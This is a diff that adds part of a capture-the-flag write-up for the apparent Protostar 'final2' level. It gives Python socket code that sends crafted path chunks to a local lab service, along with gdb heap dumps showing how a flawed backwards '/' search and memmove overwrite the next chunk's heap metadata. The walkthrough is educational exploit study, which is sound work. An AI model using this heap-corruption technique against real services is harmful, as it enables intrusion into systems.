@@ -259,3 +259,154 @@ s = socket.socket(socket.AF_INET)
 s.connect(('127.1', 2993))
 ```
 this creates a socket that we can use to send and recive data.
+
+construct a basic string that will our if's, send it, execute our script and check gdb
+
+```python
+m = "FSRD/0000ROOT/1111"
+# pad m to 128 bytes
+m += "A" * (128 - (len(m)))
+s.send(m)
+```
+
+we hit the break point
+```
+Breakpoint 1, 0x0804bd40 in check_path (
+    buf=0x804e00c "/0000ROOT/1111", 'A' <repeats 110 times>)
+    at final2/final2.c:27
+27      final2/final2.c: No such file or directory.
+        in final2/final2.c
+```
+
+and if we examin the stack
+```
+(gdb) x/3wx $esp
+0xbffff850:     0x0804e00c      0x0804e015      0x00000073
+(gdb) x/s 0x0804e00c
+0x804e00c:       "/0000ROOT/1111", 'A' <repeats 110 times>
+(gdb) x/s 0x0804e015
+0x804e015:       "/1111", 'A' <repeats 110 times>
+(gdb)
+```
+and this is our heap 
+*you can get heap addr with 'info proc mappings'*
+```
+(gdb) x/64wx 0x804e000
+0x804e000:      0x00000000      0x00000089      0x44525346      0x3030302f
+0x804e010:      0x4f4f5230      0x31312f54      0x41413131      0x41414141
+0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e080:      0x41414141      0x41414141      0x00000000      0x00000f79
+0x804e090:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0a0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
+```
+so if we can controll where 'start' points we can write any where in memory
+let's talk an another look at 'check_path' code
+
+```C
+  p = rindex(buf, '/');
+  l = strlen(p);
+  if(p){
+     start = strstr(buf, "ROOT");
+     if(start) {
+         while(*start != '/') start--;
+         memmove(start, p, l);
+     }
+  }
+```
+the
+>while(\*start != '/') start--;
+keeps going backwards from string "ROOT" until it finds a '/'
+but, if we remove the '/' before our "ROOT" the loop will probably seg fault because it will run into the unmapped memory
+addresses before the heap.
+
+we could solve this by allocating an another chunk after out first one, with a string that has no '/' before its "ROOT", its loop will keep going backwards to our first chunk
+which we can control, by changing out padding to '/'s.
+
+
+```python
+import socket
+
+s = socket.socket(socket.AF_INET)
+s.connect(('127.1', 2993))
+
+# first chunk
+ck1 = "FSRD/0000ROOT/1111"
+ck1 += "/" * (128 - (len(ck1)))
+s.send(ck1)
+
+# second chunk
+ck2 = "FSRDROOT/"
+ck2 += "A" * (128 - (len(ck2)))
+s.send(ck2)
+```
+*i renamed the variable m to ck1 and ck2 to make easier to read*
+
+we hit our first break point
+
+if we examing the heap
+```
+(gdb) x/64wx 0x804e000
+0x804e000:      0x00000000      0x00000089      0x44525346      0x3030302f
+0x804e010:      0x4f4f5230      0x31312f54      0x2f2f3131      0x2f2f2f2f
+0x804e020:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e030:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e040:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e080:      0x2f2f2f2f      0x2f2f2f2f      0x00000000      0x00000f79
+0x804e090:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0a0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
+```
+*you could set a variable in gdb for the heap address with a 
+> set $heap = 0x804e000
+and examin the heap with a 
+> x/64wx $heap*
+
+you can see our '/'(0x2f) filling the heap
+
+continue.
+
+```
+(gdb) x/64wx 0x804e000
+0x804e000:      0x00000000      0x00000089      0x44525346      0x3030302f
+0x804e010:      0x4f4f5230      0x31312f54      0x2f2f3131      0x2f2f2f2f
+0x804e020:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e030:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e040:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
+0x804e080:      0x2f2f2f2f      0x2f2f2f2f      0x00000000      0x00000089
+0x804e090:      0x44525346      0x544f4f52      0x4141412f      0x41414141
+0x804e0a0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e0b0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e0c0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e0d0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e0e0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804e0f0:      0x41414141      0x41414141      0x41414141      0x41414141
+```
+check heap and memmove arguments
+
+![image1](https://github.com/YazoSh/ctf-writeups/raw/master/images/final2-1.png)
+
+so when memmove executes, the content in p will be copied to start overriding 
+chunk2 heap meta data.
+
+![image2](https://raw.githubusercontent.com/YazoSh/ctf-writeups/master/images/final2-2.png)
+
